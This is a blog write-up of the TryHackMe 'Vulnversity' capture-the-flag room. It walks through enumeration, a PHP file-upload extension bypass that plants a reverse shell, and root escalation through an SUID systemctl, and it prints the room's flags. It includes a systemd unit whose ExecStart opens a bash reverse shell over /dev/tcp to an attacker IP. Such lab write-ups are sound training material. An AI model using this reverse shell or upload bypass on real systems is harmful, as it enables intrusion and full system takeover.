---
title: Vulnversity (Try Hack Me)
author: Robin Goyal
date: 2021-09-11 18:00 -0400
categories: [Cybersecurity, Writeups]
tags: [thm, ctf, writeup]
hidden: true
image:
  src: https://tryhackme-images.s3.amazonaws.com/room-icons/85dee7ce633f5668b104d329da2769c3.png
---

I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.

## Enumeration

As always, let's perform an initial nmap scan of the top 1000 ports.

![nmap results](/assets/img/posts/thm-vulnversity/nmap-initial.jpg)

There's lots to digest but let's take it step by step. There are several open ports:
- 21 (FTP)
- 22 (SSH)
- 139/445 (Samba)
- 3128 (Squid Proxy)
- 3333 (HTTP)

The target is likely an Ubuntu Linux OS from the version information for SSH and HTTP services.

The smb scripts against the Samba service reveal the OS (though Windows 6.1 is likely incorrect), Computer name, Domain name, FQDN, and more.

Let's use a methodical approach to enumerate and exploit these services.

### FTP

The first approach I take with FTP is to just try out anonymous authentication.

![ftp failed login](/assets/img/posts/thm-vulnversity/ftp-failed-login.jpg)

Without a valid set of credentials and potentially vulnerable version of FTP, we'll loop back to this if necessary.

### Samba

For SMB, my initial approach is similar to FTP to list the shares using smbclient unauthenticated.

![smb client listing](/assets/img/posts/thm-vulnversity/smb-client-listing.jpg)

The shares ending with a $ may be default shares but there does not seem to be any shares with content for us to view.

### HTTP

Browsing to the index page of the web application,

![landing page](/assets/img/posts/thm-vulnversity/landing-page.jpg)

and we are presented with a beautiful landing page of "Vuln University".

Browsing the web application, there is no information leaked in the page source, no robots.txt file, or in the HTML content presented. Maybe directory enumeration will provide us a path to proceed with.

![gobuster](/assets/img/posts/thm-vulnversity/gobuster.jpg)

/internal does not look like it was meant for the users of the application. Let's see where it leads us to!

![internal](/assets/img/posts/thm-vulnversity/internal.jpg)

A form to upload files! This might be a vector to abuse the form and upload a reverse shell of ours. Before we do that, we need to figure out two things:
1. The backend language used (PHP, Python, Java, etc)
2. Where the files are uploaded

#### Form Upload

For the first point, I used nikto and whatweb to try to determine the backend programming language but no luck. However, Wappalyzer (a Chrome extension to analyze web application technologies), revealed that it was PHP.

![technologies](/assets/img/posts/thm-vulnversity/technologies.jpg)

Maybe Wappalyzer is guesstimating that it is PHP based on the other information but I could not determine it myself [^http-fingerprinting]. No matter. We shall assume it is PHP for now and try to upload a reverse shell payload.

Next, we'll need to determine where the uploaded files end up. It may likely be hidden behind the /internal endpoint since it's not meant to be exposed to the public.

![gobuster internal](/assets/img/posts/thm-vulnversity/gobuster-internal.jpg)

Great! With a /uploads folder, we have everything sorted out. Let's try to upload Pentest Monkey's reverse shell payload [^php-reverse-shell].

## Initial Foothold

Trying to upload the file as rev.php failed with an error message saying the extension is not allowed. We could try other php extensions that could bypass this server side filter [^php-extension-bypass].

There is only a few PHP extensions that we could manually modify the extension but let's hone our Burpsuite skills to build this attack in Burp Intruder.

Intercepting the upload file request and sending it off to Burp Intruder, we'll clear all payload positions and add one around the extension name.

![burp payload](/assets/img/posts/thm-vulnversity/burp-intruder-payload.jpg)

Next, we'll add our payload list and launch the attack.

![burp attack](/assets/img/posts/thm-vulnversity/burp-attack.jpg)

The .phtml extension is the only one with a different response length! We can set up a netcat listener, trigger the PHP code, and hopefully obtain a reverse shell if all of our assumptions about the backend language are correct.

![reverse shell](/assets/img/posts/thm-vulnversity/reverse-shell.jpg)

Success! We have obtained the reverse shell. The user flag is available at /home/bill/user.txt as a world-readable file and we can switch focus towards obtaining privilege escalation.

User Flag: `8bd7992fbe8a6ad22a63361004cfcedb`

## Privilege Escalation

We aren't able to check for sudo privileges for www-data since we're prompted for a password. There were no interesting files for bill or www-data and many of my typical commands did not pan out.

Next, I downloaded a Linux Privesc Enumeration Script (linpeas) from my attacker system and I could not find anything interesting.

After spending some time, I checked out the hint on the room description and it mentioned systemctl, a misconfigured SUID binary (more details in Reflection).

![suid](/assets/img/posts/thm-vulnversity/suid.jpg)

With the SUID bit set, this means we can execute this command without sudo but have sudo privileges.

Let's check if gtfobins has an entry for systemctl.

![systemctl](/assets/img/posts/thm-vulnversity/gtfobins.jpg)

Instead of reading a file, we'll modify the ExecStart value to create a reverse shell connection on port 5555 of our attacker system. The service file looks as follows:

```
[Unit]
Description=Generate Root Shell

[Service]
ExecStart=/bin/bash -c "/bin/bash -l > /dev/tcp/10.6.5.103/5555 0<&1 2>&1"

[Install]
WantedBy=multi-user.target
```

Once we set up our netcat listener on port 5555, we can link, enable, and start the service file as indicated in the gtfobins image, and we'll have our reverse shell!

![privesc](/assets/img/posts/thm-vulnversity/privesc.jpg)

There we go! We could upgrade the shell if we want to, but let's just get the root flag completing this room.

Root Flag: `a58ff8579f0a9270368d33a9966c7fd5`

## Reflection

Once again, I made the mistake of not being patient and enumerating the target properly. I reacted quickly and viewed the hint even though I ran the exact command needed to find the systemctl binary.

## References

[^http-fingerprinting]: <https://www.quora.com/Is-there-any-way-to-find-out-the-programming-language-used-in-the-website>
[^php-reverse-shell]: <https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>
[^php-extension-bypass]: <https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass>
